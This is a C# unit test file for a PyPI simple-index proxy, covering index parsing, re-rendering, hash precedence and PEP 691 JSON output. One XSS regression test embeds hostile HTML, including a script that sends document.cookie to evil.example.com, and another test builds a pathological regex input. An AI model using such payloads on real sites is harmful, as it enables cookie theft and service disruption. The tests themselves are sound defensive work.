using System.Diagnostics;
using System.Text.Json;
using System.Text.RegularExpressions;
using Dependably.Api.PyPiProtocol;

namespace Dependably.Tests.Unit;

/// <summary>
/// The upstream simple-index parser reads attacker-controllable HTML (a hostile or MITM'd
/// upstream), so its anchor pattern must be linear — no super-linear backtracking — while
/// still extracting real PEP 503 pages correctly. It must also never let anything outside a
/// well-formed anchor's href/text reach the caller, since the served index is rendered
/// entirely from the parsed entries (<see cref="PyPiSimpleIndexHelper.RenderMergedSimpleIndex"/>),
/// never by copying upstream HTML.
/// </summary>
[Trait("Category", "Unit")]
public partial class PyPiSimpleIndexRewriteTests
{
    [GeneratedRegex("""<a href="/packages/([^"#]+)(?:#sha256=([^"]+))?"( data-yanked="[^"]*")?>""")]
    private static partial Regex HtmlAnchorRegex();

    // Shaped like a real pypi.org simple page for the mypy-extensions fixture package
    // (tests/Dependably.Tests/Fixtures/packages/pypi): sha256 fragments, requires-python
    // and metadata-sidecar attributes, multiple files per release.
    private const string FixtureSimpleIndexHtml = """
        <!DOCTYPE html>
        <html>
          <head>
            <meta name="pypi:repository-version" content="1.1">
            <title>Links for mypy-extensions</title>
          </head>
          <body>
            <h1>Links for mypy-extensions</h1>
            <a href="https://files.pythonhosted.org/packages/98/a4/abc/mypy_extensions-1.0.0-py3-none-any.whl#sha256=4392f6c0eb8a5668a69e23d168ffa70f0be9ccfd32b5cc2d26a34ae5b844552d" data-requires-python="&gt;=3.5" data-dist-info-metadata="sha256=deadbeef" data-core-metadata="sha256=deadbeef">mypy_extensions-1.0.0-py3-none-any.whl</a><br/>
            <a href="https://files.pythonhosted.org/packages/02/fe/def/mypy_extensions-1.0.0.tar.gz#sha256=75dbf8955dc00442a438fc4d0666508a9a97b6bd41aa2f0ffe9d2f2725af0782" data-requires-python="&gt;=3.5">mypy_extensions-1.0.0.tar.gz</a><br/>
          </body>
        </html>
        """;

    [Fact]
    public void FixtureIndex_AnchorsParsedToFilenameAndSha256()
    {
        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(FixtureSimpleIndexHtml);

        Assert.Equal(2, entries.Count);
        Assert.Contains(entries, e => e.Filename == "mypy_extensions-1.0.0-py3-none-any.whl"
            && e.Sha256 == "4392f6c0eb8a5668a69e23d168ffa70f0be9ccfd32b5cc2d26a34ae5b844552d");
        Assert.Contains(entries, e => e.Filename == "mypy_extensions-1.0.0.tar.gz"
            && e.Sha256 == "75dbf8955dc00442a438fc4d0666508a9a97b6bd41aa2f0ffe9d2f2725af0782");
    }

    [Fact]
    public void RenderedIndex_AnchorsPointAtLocalPackagesRoute_MetadataSidecarAttributesDropped()
    {
        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(FixtureSimpleIndexHtml);
        string rendered = PyPiSimpleIndexHelper.RenderMergedSimpleIndex(
            "mypy-extensions", entries, [], PyPiSimpleIndexHelper.NoHostedFiles, OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        Assert.Contains(
            "href=\"/packages/mypy_extensions-1.0.0-py3-none-any.whl#sha256=4392f6c0eb8a5668a69e23d168ffa70f0be9ccfd32b5cc2d26a34ae5b844552d\"",
            rendered);
        Assert.Contains(
            "href=\"/packages/mypy_extensions-1.0.0.tar.gz#sha256=75dbf8955dc00442a438fc4d0666508a9a97b6bd41aa2f0ffe9d2f2725af0782\"",
            rendered);

        // Anchor text (the filename pip displays) survives.
        Assert.Contains(">mypy_extensions-1.0.0-py3-none-any.whl</a>", rendered);
        Assert.Contains(">mypy_extensions-1.0.0.tar.gz</a>", rendered);

        // No anchor still points upstream, and the metadata-sidecar attributes never survive
        // parsing — the renderer only ever emits the anchors it constructs itself.
        Assert.DoesNotContain("files.pythonhosted.org", rendered);
        Assert.DoesNotContain("data-dist-info-metadata", rendered);
        Assert.DoesNotContain("data-core-metadata", rendered);
    }

    // ── XSS regression: hostile upstream markup never reaches the served index ─────────────

    /// <summary>
    /// Regression for the pass-through XSS: before the fix, the served index was built by
    /// splicing/rewriting the raw upstream HTML in place, so a <c>&lt;script&gt;</c> tag or any
    /// other markup outside a matched anchor flowed into the response verbatim. The fix parses
    /// only filename/href pairs out of matched anchors and re-renders the whole document from
    /// that data, so hostile markup — whether inside an unmatched anchor attribute or entirely
    /// outside any anchor — can never appear in the served HTML.
    /// </summary>
    [Fact]
    public void HostileUpstreamMarkup_NeverReachesRenderedIndex()
    {
        const string hostileHtml = """
            <!DOCTYPE html>
            <html>
              <head><script>alert(document.cookie)</script></head>
              <body>
                <img src=x onerror="alert('xss')">
                <a href="https://evil.example.com/pwn.whl" onclick="alert(1)">pwn-1.0.0.whl</a>
                <script>fetch('https://evil.example.com/steal?c='+document.cookie)</script>
                <a href="https://files.pythonhosted.org/packages/real-1.0.0.tar.gz#sha256=abc123">real-1.0.0.tar.gz</a>
              </body>
            </html>
            """;

        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(hostileHtml);
        string rendered = PyPiSimpleIndexHelper.RenderMergedSimpleIndex(
            "pkg", entries, [], PyPiSimpleIndexHelper.NoHostedFiles, OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        // Only the two anchor filenames are ever admitted — one from a "hostile" anchor (its
        // filename text alone is harmless and gets HTML-encoded) and one from the legitimate one.
        Assert.Equal(2, entries.Count);

        // None of the hostile markup survives into the rendered document.
        Assert.DoesNotContain("<script", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onerror", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("onclick", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("evil.example.com", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("document.cookie", rendered, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("<img", rendered, StringComparison.OrdinalIgnoreCase);

        // The legitimate anchor is still present, re-rendered through our own encoding.
        Assert.Contains("href=\"/packages/real-1.0.0.tar.gz#sha256=abc123\"", rendered);
        Assert.Contains(">real-1.0.0.tar.gz</a>", rendered);
    }

    [Fact]
    public void AnchorWithoutAbsoluteHref_IsIgnored()
    {
        const string html = """<a href="/packages/local-1.0.0.tar.gz">local-1.0.0.tar.gz</a>""";

        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(html);

        Assert.Empty(entries);
    }

    [Fact]
    public void SingleQuotedAttributes_AreParsed()
    {
        const string html =
            "<a href=\"https://files.pythonhosted.org/packages/aa/bb/pkg-2.0.tar.gz\" data-requires-python='>=3.8'>pkg-2.0.tar.gz</a>";

        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(html);

        Assert.Single(entries);
        Assert.Equal("pkg-2.0.tar.gz", entries[0].Filename);
    }

    [Fact]
    public void PathologicalUnterminatedAnchor_CompletesLinearly()
    {
        // Worst case for a backtracking-prone attribute pattern: a long run of attribute
        // characters and quote flips after "<a " with no closing ">" — the nested-quantifier
        // form of this pattern goes super-linear here. The atomic-group pattern must finish
        // (well inside the 2 s RegexTimeout) and yield no entries (no matched anchor).
        string attackRun = string.Concat(Enumerable.Repeat("x'y'\"z\"", 20_000));
        string html = "<a " + attackRun;

        var sw = Stopwatch.StartNew();
        var entries = PyPiSimpleIndexHelper.ParseUpstreamSimpleIndexLinks(html);
        sw.Stop();

        Assert.Empty(entries);
        Assert.True(sw.Elapsed < TimeSpan.FromSeconds(2),
            $"Parse took {sw.Elapsed.TotalMilliseconds:F0}ms — expected linear-time matching.");
    }

    [Fact]
    public void MultiFileHostedVersion_RendersOneAnchorPerFile_WithPerFileSha256()
    {
        // One hosted release holding a wheel AND an sdist: the index lists both files, each
        // with its own sha256 fragment — never a single anchor from the version row.
        var version = new Dependably.Infrastructure.PackageVersion
        {
            Id = "v1",
            PackageId = "p1",
            Version = "1.0.0",
            Purl = "pkg:pypi/demo@1.0.0",
            BlobKey = "hosted/o1/pypi/demo/1.0.0/demo-1.0.0-py3-none-any.whl",
            Filename = "demo-1.0.0-py3-none-any.whl",
            ChecksumSha256 = "wheelsha",
            Origin = "uploaded",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };
        var files = new[]
        {
            new Dependably.Infrastructure.PackageVersionFile(
                "f1", "v1", "o1", "demo-1.0.0-py3-none-any.whl",
                "hosted/o1/pypi/demo/1.0.0/demo-1.0.0-py3-none-any.whl", 100, "wheelsha", DateTimeOffset.UnixEpoch),
            new Dependably.Infrastructure.PackageVersionFile(
                "f2", "v1", "o1", "demo-1.0.0.tar.gz",
                "hosted/o1/pypi/demo/1.0.0/demo-1.0.0.tar.gz", 40, "sdistsha", DateTimeOffset.UnixEpoch),
        }.ToLookup(f => f.PackageVersionId);

        string rendered = PyPiSimpleIndexHelper.RenderLocalSimpleIndex(
            "demo", [version], files, OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        Assert.Contains("href=\"/packages/demo-1.0.0-py3-none-any.whl#sha256=wheelsha\"", rendered);
        Assert.Contains("href=\"/packages/demo-1.0.0.tar.gz#sha256=sdistsha\"", rendered);
    }

    [Fact]
    public void HostedVersionWithoutFileRows_FallsBackToVersionRowArtifact()
    {
        // Synthetic proxy projections (and any not-yet-backfilled row) carry their single
        // artifact on the version row and must keep rendering exactly one anchor.
        var version = new Dependably.Infrastructure.PackageVersion
        {
            Id = "v1",
            PackageId = "p1",
            Version = "1.0.0",
            Purl = "pkg:pypi/demo@1.0.0",
            BlobKey = "proxy/abc/demo-1.0.0.tar.gz",
            Filename = "demo-1.0.0.tar.gz",
            ChecksumSha256 = "abc",
            Origin = "proxy",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };

        string rendered = PyPiSimpleIndexHelper.RenderLocalSimpleIndex(
            "demo", [version], PyPiSimpleIndexHelper.NoHostedFiles,
            OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        Assert.Contains("href=\"/packages/demo-1.0.0.tar.gz#sha256=abc\"", rendered);
        Assert.Single(rendered.Split("<a href=").Skip(1));
    }

    [Fact]
    public void MergedIndex_FilenameHostedLocallyAndUpstream_AdvertisesLocalSha256()
    {
        // Dependency-confusion / mixed-namespace merge: a tenant hosts demo-1.0.0.tar.gz AND
        // upstream PyPI publishes the same filename with a DIFFERENT sha256. The download path
        // resolves the uploaded file first and serves the LOCAL blob, so the merged simple
        // index must advertise the LOCAL sha256 for that filename — advertising the upstream
        // digest hands pip a hash the served blob can never satisfy (HASH MISMATCH failure).
        const string localSha = "1111111111111111111111111111111111111111111111111111111111111111";
        const string upstreamSha = "2222222222222222222222222222222222222222222222222222222222222222";

        var upstreamEntries = new[]
        {
            new PyPiSimpleIndexHelper.UpstreamSimpleIndexEntry("demo-1.0.0.tar.gz", upstreamSha),
        };

        var version = new Dependably.Infrastructure.PackageVersion
        {
            Id = "v1",
            PackageId = "p1",
            Version = "1.0.0",
            Purl = "pkg:pypi/demo@1.0.0",
            BlobKey = "hosted/o1/pypi/demo/1.0.0/demo-1.0.0.tar.gz",
            Filename = "demo-1.0.0.tar.gz",
            ChecksumSha256 = localSha,
            Origin = "uploaded",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };
        var files = new[]
        {
            new Dependably.Infrastructure.PackageVersionFile(
                "f1", "v1", "o1", "demo-1.0.0.tar.gz",
                "hosted/o1/pypi/demo/1.0.0/demo-1.0.0.tar.gz", 100, localSha, DateTimeOffset.UnixEpoch),
        }.ToLookup(f => f.PackageVersionId);

        string rendered = PyPiSimpleIndexHelper.RenderMergedSimpleIndex(
            "demo", upstreamEntries, [version], files,
            OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        // The served anchor carries the LOCAL sha256 (matches the blob the download path serves).
        Assert.Contains($"href=\"/packages/demo-1.0.0.tar.gz#sha256={localSha}\"", rendered);
        // The upstream sha256 must NOT be advertised for the collided filename.
        Assert.DoesNotContain(upstreamSha, rendered);
        // The filename is listed exactly once (dedupe collapses the upstream duplicate).
        Assert.Single(rendered.Split(">demo-1.0.0.tar.gz</a>").Skip(1));
    }

    /// <summary>
    /// The PEP 691 JSON counterpart of
    /// <see cref="MergedIndex_FilenameHostedLocallyAndUpstream_AdvertisesLocalSha256"/>. The two
    /// renderers serve the same merge for one URL, chosen only by the Accept header, so the
    /// local-wins-collision rule must hold identically in both — and modern pip/uv negotiate the
    /// JSON form, making it the representation most exposed to a HASH MISMATCH here. Pinning both
    /// renderers keeps a future edit to one from silently diverging from the other.
    ///
    /// Mixed by construction: the collided filename must resolve to the local digest while an
    /// upstream-only filename in the same response is still advertised from upstream — so the
    /// rule cannot be satisfied by simply dropping upstream entries.
    /// </summary>
    [Fact]
    public void MergedIndexJson_FilenameHostedLocallyAndUpstream_AdvertisesLocalSha256()
    {
        const string localSha = "1111111111111111111111111111111111111111111111111111111111111111";
        const string upstreamSha = "2222222222222222222222222222222222222222222222222222222222222222";
        const string upstreamOnlySha = "3333333333333333333333333333333333333333333333333333333333333333";

        var upstreamEntries = new[]
        {
            new PyPiSimpleIndexHelper.UpstreamSimpleIndexEntry("demo-1.0.0.tar.gz", upstreamSha),
            new PyPiSimpleIndexHelper.UpstreamSimpleIndexEntry("demo-2.0.0.tar.gz", upstreamOnlySha),
        };

        var version = new Dependably.Infrastructure.PackageVersion
        {
            Id = "v1",
            PackageId = "p1",
            Version = "1.0.0",
            Purl = "pkg:pypi/demo@1.0.0",
            BlobKey = "hosted/o1/pypi/demo/1.0.0/demo-1.0.0.tar.gz",
            Filename = "demo-1.0.0.tar.gz",
            ChecksumSha256 = localSha,
            Origin = "uploaded",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };
        var files = new[]
        {
            new Dependably.Infrastructure.PackageVersionFile(
                "f1", "v1", "o1", "demo-1.0.0.tar.gz",
                "hosted/o1/pypi/demo/1.0.0/demo-1.0.0.tar.gz", 100, localSha, DateTimeOffset.UnixEpoch),
        }.ToLookup(f => f.PackageVersionId);

        string rendered = PyPiSimpleIndexHelper.RenderMergedSimpleIndexJson(
            "demo", upstreamEntries, [version], files,
            OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        using var doc = JsonDocument.Parse(rendered);
        var entries = doc.RootElement.GetProperty("files").EnumerateArray().ToList();

        // The collided filename is listed exactly once, carrying the LOCAL sha256 — the digest of
        // the blob the download path actually serves.
        var collided = Assert.Single(entries, f => f.GetProperty("filename").GetString() == "demo-1.0.0.tar.gz");
        Assert.Equal(localSha, collided.GetProperty("hashes").GetProperty("sha256").GetString());
        // The upstream sha256 must NOT be advertised anywhere for the collided filename.
        Assert.DoesNotContain(upstreamSha, rendered);

        // The upstream-only filename is still merged in, advertised with its upstream digest.
        var upstreamOnly = Assert.Single(entries, f => f.GetProperty("filename").GetString() == "demo-2.0.0.tar.gz");
        Assert.Equal(upstreamOnlySha, upstreamOnly.GetProperty("hashes").GetProperty("sha256").GetString());
    }

    private static Dictionary<string, Dependably.Infrastructure.VulnGateSignals> EmptySignals()
        => new();

    // ── PEP 691 JSON Simple API renderers ───────────────────────────────────

    [Fact]
    public void RenderProjectListJson_ProducesPep691MetaAndProjectsShape()
    {
        string json = PyPiSimpleIndexHelper.RenderProjectListJson(["alpha", "beta"]);

        using var doc = JsonDocument.Parse(json);
        Assert.Equal("1.0", doc.RootElement.GetProperty("meta").GetProperty("api-version").GetString());
        var names = doc.RootElement.GetProperty("projects").EnumerateArray()
            .Select(p => p.GetProperty("name").GetString())
            .ToList();
        Assert.Equal(["alpha", "beta"], names);
    }

    [Fact]
    public void RenderLocalSimpleIndexJson_MultiFileHostedVersion_OneFileEntryPerFile_WithSha256Hashes()
    {
        // JSON counterpart of MultiFileHostedVersion_RendersOneAnchorPerFile_WithPerFileSha256 —
        // a hosted release holding a wheel AND an sdist must list both files, each carrying its
        // own sha256 hash, never a single collapsed entry.
        var version = new Dependably.Infrastructure.PackageVersion
        {
            Id = "v1",
            PackageId = "p1",
            Version = "1.0.0",
            Purl = "pkg:pypi/demo@1.0.0",
            BlobKey = "hosted/o1/pypi/demo/1.0.0/demo-1.0.0-py3-none-any.whl",
            Filename = "demo-1.0.0-py3-none-any.whl",
            ChecksumSha256 = "wheelsha",
            Origin = "uploaded",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };
        var files = new[]
        {
            new Dependably.Infrastructure.PackageVersionFile(
                "f1", "v1", "o1", "demo-1.0.0-py3-none-any.whl",
                "hosted/o1/pypi/demo/1.0.0/demo-1.0.0-py3-none-any.whl", 100, "wheelsha", DateTimeOffset.UnixEpoch),
            new Dependably.Infrastructure.PackageVersionFile(
                "f2", "v1", "o1", "demo-1.0.0.tar.gz",
                "hosted/o1/pypi/demo/1.0.0/demo-1.0.0.tar.gz", 40, "sdistsha", DateTimeOffset.UnixEpoch),
        }.ToLookup(f => f.PackageVersionId);

        string json = PyPiSimpleIndexHelper.RenderLocalSimpleIndexJson(
            "demo", [version], files, OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        using var doc = JsonDocument.Parse(json);
        Assert.Equal("demo", doc.RootElement.GetProperty("name").GetString());
        var entries = doc.RootElement.GetProperty("files").EnumerateArray().ToList();
        Assert.Equal(2, entries.Count);

        var wheel = entries.Single(e => e.GetProperty("filename").GetString() == "demo-1.0.0-py3-none-any.whl");
        Assert.Equal("/packages/demo-1.0.0-py3-none-any.whl", wheel.GetProperty("url").GetString());
        Assert.Equal("wheelsha", wheel.GetProperty("hashes").GetProperty("sha256").GetString());
        Assert.False(wheel.GetProperty("yanked").GetBoolean());

        var sdist = entries.Single(e => e.GetProperty("filename").GetString() == "demo-1.0.0.tar.gz");
        Assert.Equal("sdistsha", sdist.GetProperty("hashes").GetProperty("sha256").GetString());
    }

    [Fact]
    public void RenderLocalSimpleIndexJson_YankedVersion_CarriesReasonString()
    {
        // Per PEP 592/691, "yanked" is either false, true, or a non-empty reason string. A yank
        // with a recorded reason must surface that reason, not a bare boolean.
        var version = new Dependably.Infrastructure.PackageVersion
        {
            Id = "v1",
            PackageId = "p1",
            Version = "1.0.0",
            Purl = "pkg:pypi/demo@1.0.0",
            BlobKey = "proxy/abc/demo-1.0.0.tar.gz",
            Filename = "demo-1.0.0.tar.gz",
            ChecksumSha256 = "abc",
            Origin = "proxy",
            Yanked = true,
            YankReason = "security issue",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };

        string json = PyPiSimpleIndexHelper.RenderLocalSimpleIndexJson(
            "demo", [version], PyPiSimpleIndexHelper.NoHostedFiles,
            OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        using var doc = JsonDocument.Parse(json);
        var entry = doc.RootElement.GetProperty("files").EnumerateArray().Single();
        Assert.Equal("security issue", entry.GetProperty("yanked").GetString());
    }

    [Fact]
    public void RenderMergedSimpleIndexJson_UpstreamAndLocalFilesBothPresent_NoDuplicates()
    {
        var upstreamEntries = new List<PyPiSimpleIndexHelper.UpstreamSimpleIndexEntry>
        {
            new("demo-0.9.0.tar.gz", "upstreamsha"),
        };
        var localVersion = new Dependably.Infrastructure.PackageVersion
        {
            Id = "v1",
            PackageId = "p1",
            Version = "1.0.0",
            Purl = "pkg:pypi/demo@1.0.0",
            BlobKey = "hosted/o1/pypi/demo/1.0.0/demo-1.0.0.tar.gz",
            Filename = "demo-1.0.0.tar.gz",
            ChecksumSha256 = "localsha",
            Origin = "uploaded",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };

        string json = PyPiSimpleIndexHelper.RenderMergedSimpleIndexJson(
            "demo", upstreamEntries, [localVersion], PyPiSimpleIndexHelper.NoHostedFiles,
            OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        using var doc = JsonDocument.Parse(json);
        var filenames = doc.RootElement.GetProperty("files").EnumerateArray()
            .Select(e => e.GetProperty("filename").GetString())
            .ToList();
        // Both planes are listed, each exactly once. Emission order is not asserted: PEP 691
        // gives "files" no ordering semantics, and the order-dependent rule that does matter —
        // which sha256 wins a filename collision — is pinned by
        // MergedIndexJson_FilenameHostedLocallyAndUpstream_AdvertisesLocalSha256.
        Assert.Equal(2, filenames.Count);
        Assert.Contains("demo-0.9.0.tar.gz", filenames);
        Assert.Contains("demo-1.0.0.tar.gz", filenames);
    }

    // ── The two renderers cannot disagree about the merge ────────────────────

    /// <summary>
    /// The HTML and JSON forms are two spellings of one merge, chosen only by the Accept header,
    /// so for any input they must advertise the same files with the same digests and the same
    /// yank state. Only their spelling may differ (a <c>data-yanked</c> attribute vs. PEP 592's
    /// <c>reason | true | false</c>; a JSON-only <c>size</c>).
    ///
    /// Both renderers read one merged entry list, so this holds by construction. The test is what
    /// makes a future edit that reintroduces a second merge loop go red instead of shipping: the
    /// fixture drives every branch of the rule at once — a local/upstream filename collision, a
    /// duplicate upstream anchor, an upstream-only file, a multi-file version, a version with no
    /// file rows, a yanked version, and a hard-blocked version that must appear in neither form.
    /// </summary>
    [Fact]
    public void MergedIndex_HtmlAndJson_AdvertiseTheSameFilesWithTheSameDigests()
    {
        const string collidedLocalSha = "1111111111111111111111111111111111111111111111111111111111111111";
        const string collidedUpstreamSha = "2222222222222222222222222222222222222222222222222222222222222222";
        const string upstreamOnlySha = "3333333333333333333333333333333333333333333333333333333333333333";
        const string wheelSha = "4444444444444444444444444444444444444444444444444444444444444444";
        const string yankedSha = "5555555555555555555555555555555555555555555555555555555555555555";
        const string projectedSha = "6666666666666666666666666666666666666666666666666666666666666666";
        const string blockedSha = "7777777777777777777777777777777777777777777777777777777777777777";

        var upstreamEntries = new List<PyPiSimpleIndexHelper.UpstreamSimpleIndexEntry>
        {
            new("demo-1.0.0.tar.gz", collidedUpstreamSha),   // collides with a local file
            new("demo-9.9.9.tar.gz", upstreamOnlySha),        // upstream only
            new("demo-9.9.9.tar.gz", upstreamOnlySha),        // duplicate anchor on the same page
            new("demo-8.0.0.tar.gz", null),                   // upstream entry with no digest
        };

        var multiFile = Version("v1", "1.0.0", "demo-1.0.0.tar.gz", collidedLocalSha);
        var yanked = Version("v2", "2.0.0", "demo-2.0.0.tar.gz", yankedSha);
        yanked.Yanked = true;
        yanked.YankReason = "broken sdist";
        var projected = Version("v3", "3.0.0", "demo-3.0.0.tar.gz", projectedSha);   // no file rows
        var blocked = Version("v4", "4.0.0", "demo-4.0.0.tar.gz", blockedSha);
        blocked.ManualBlockState = "blocked";

        var files = new[]
        {
            File("f1", "v1", "demo-1.0.0.tar.gz", collidedLocalSha, 100),
            File("f2", "v1", "demo-1.0.0-py3-none-any.whl", wheelSha, 250),
            File("f3", "v2", "demo-2.0.0.tar.gz", yankedSha, 300),
            File("f4", "v4", "demo-4.0.0.tar.gz", blockedSha, 400),
        }.ToLookup(f => f.PackageVersionId);

        Dependably.Infrastructure.PackageVersion[] versions = [multiFile, yanked, projected, blocked];

        string html = PyPiSimpleIndexHelper.RenderMergedSimpleIndex(
            "demo", upstreamEntries, versions, files,
            OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);
        string json = PyPiSimpleIndexHelper.RenderMergedSimpleIndexJson(
            "demo", upstreamEntries, versions, files,
            OrgSettingsFixture.Default(), EmptySignals(), DateTimeOffset.UnixEpoch);

        var htmlAdvertised = ParseHtmlAnchors(html);
        var jsonAdvertised = ParseJsonFiles(json);

        Assert.Equal(htmlAdvertised, jsonAdvertised);

        // Pin the merge itself too, so "both forms agree" cannot be satisfied by both being wrong.
        Assert.Equal(
            new List<(string, string?, bool)>
            {
                ("demo-1.0.0.tar.gz", collidedLocalSha, false),          // local wins the collision
                ("demo-1.0.0-py3-none-any.whl", wheelSha, false),
                ("demo-2.0.0.tar.gz", yankedSha, true),
                ("demo-3.0.0.tar.gz", projectedSha, false),              // version-row fallback
                ("demo-9.9.9.tar.gz", upstreamOnlySha, false),           // upstream only, once
                ("demo-8.0.0.tar.gz", null, false),
            },
            htmlAdvertised);
        // The hard-blocked version reaches neither form.
        Assert.DoesNotContain(blockedSha, html);
        Assert.DoesNotContain(blockedSha, json);
        // Nor does the upstream digest for the collided filename.
        Assert.DoesNotContain(collidedUpstreamSha, html);
        Assert.DoesNotContain(collidedUpstreamSha, json);
    }

    // (filename, sha256, yanked) as the PEP 503 HTML form advertises it.
    private static List<(string Filename, string? Sha256, bool Yanked)> ParseHtmlAnchors(string html) =>
        HtmlAnchorRegex().Matches(html)
            .Select(m => (m.Groups[1].Value,
                m.Groups[2].Success ? m.Groups[2].Value : null,
                m.Groups[3].Success))
            .ToList();

    // The same triple as the PEP 691 JSON form advertises it: `yanked` is false, a reason string,
    // or true — every non-false shape means yanked.
    private static List<(string Filename, string? Sha256, bool Yanked)> ParseJsonFiles(string json)
    {
        using var doc = JsonDocument.Parse(json);
        return doc.RootElement.GetProperty("files").EnumerateArray()
            .Select(f => (
                f.GetProperty("filename").GetString()!,
                f.GetProperty("hashes").TryGetProperty("sha256", out var sha) ? sha.GetString() : null,
                f.GetProperty("yanked").ValueKind != JsonValueKind.False))
            .ToList();
    }

    private static Dependably.Infrastructure.PackageVersion Version(
        string id, string version, string filename, string sha256) => new()
        {
            Id = id,
            PackageId = "p1",
            Version = version,
            Purl = $"pkg:pypi/demo@{version}",
            BlobKey = $"hosted/o1/pypi/demo/{version}/{filename}",
            Filename = filename,
            ChecksumSha256 = sha256,
            Origin = "uploaded",
            CreatedAt = DateTimeOffset.UnixEpoch,
        };

    private static Dependably.Infrastructure.PackageVersionFile File(
        string id, string versionId, string filename, string sha256, long sizeBytes)
        => new(id, versionId, "o1", filename, $"hosted/o1/pypi/demo/{filename}", sizeBytes, sha256,
            DateTimeOffset.UnixEpoch);
}

/// <summary>Minimal default <see cref="Dependably.Infrastructure.OrgSettings"/> for renderer tests.</summary>
file static class OrgSettingsFixture
{
    public static Dependably.Infrastructure.OrgSettings Default() => new() { AnonymousPull = true };
}
